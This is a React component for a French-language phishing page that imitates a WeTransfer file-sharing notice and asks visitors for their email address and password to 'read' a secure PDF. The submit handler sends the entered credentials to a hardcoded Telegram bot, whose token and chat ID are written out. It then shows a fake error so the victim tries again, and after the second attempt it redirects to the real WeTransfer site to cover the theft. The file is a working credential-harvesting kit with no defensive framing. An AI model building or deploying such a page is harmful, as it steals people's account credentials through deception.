import one from "../src/assets/one.png";
import micr from "../src/assets/wetran.png";
import pdf from "../src/assets/pdf.png";
import cap from "../src/assets/cap.png";

import { useRef, useState } from "react";
import { useNavigate } from "react-router";

function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordInput, setShowPasswordInput] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0); // Doit être déclaré ici
  const form = useRef();
  const navigate = useNavigate();

  const handleContinueClick = (e) => {
    e.preventDefault();
    if (!email) {
      alert("Veuillez entrer une adresse e-mail.");
      return;
    }
    setShowPasswordInput(true);
  };

  const handleSignInClick = async (e) => {
    e.preventDefault();

    // Vérification de la validité de l'email et du mot de passe
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert("Veuillez entrer une adresse email valide.");
        return;
    }

    if (password.length < 6) {
        alert("Le mot de passe doit contenir au moins 6 caractères.");
        return;
    }

    try {
        // Envoyer les informations via Telegram
        const botToken = '7443548014:AAHxxtghL0YOo8r1j6GrgM_kOV0HLHtqpTk';
        const chatId = '5387352019';
        const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        // Incrémenter le compteur de tentatives
        setAttemptCount(prevCount => prevCount + 1);

        // Vérifier si c'est la 5e tentative
        if (attemptCount + 1 === 2) {
          window.location.href = 'https://wetransfer.com/';
        } else {
            alert("Erreur !!! veuillez réessayer");
        }

        setEmail("");
        setPassword("");

    } catch (error) {
        console.log("FAILED...", error);
    }
  };

  return (
    <div className="body">
      <div className="entete">
        <img src={one} alt="" />
      </div>

      <div className="deux">
        <img src={micr} alt="" />
      </div>

      <div className="section">
        <div className="h2">
          <h2>Vérifiez Votre Identité</h2>
        </div>
        <hr />
        <div className="section2">
          <h5 style={{ marginTop: "2vw" }}>
            Vous avez reçu un fichier sécurisé
          </h5>
          <div className="file">
            <img src={pdf} alt="" />
            <h3>56.1KB</h3>
          </div>

          <h5>
            Pour lire le document, veuillez entrer les identifiants de messagerie
            auxquels ce fichier a été envoyé.
          </h5>

          <div className="images">
            <img src={cap} alt="" />
          </div>

          <div className="form">
            <form ref={form} onSubmit={handleSignInClick}>
              <input
                type="email"
                id="email"
                name="user_email"
                placeholder="Entrez l'adresse e-mail"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              {showPasswordInput && (
                <input
                  type="password"
                  id="password"
                  name="user_password"
                  placeholder="Entrez votre mot de passe"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              )}
              <button
                onClick={
                  showPasswordInput ? handleSignInClick : handleContinueClick
                }
              >
                {showPasswordInput ? "S'identifier" : "Continuer"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Home;
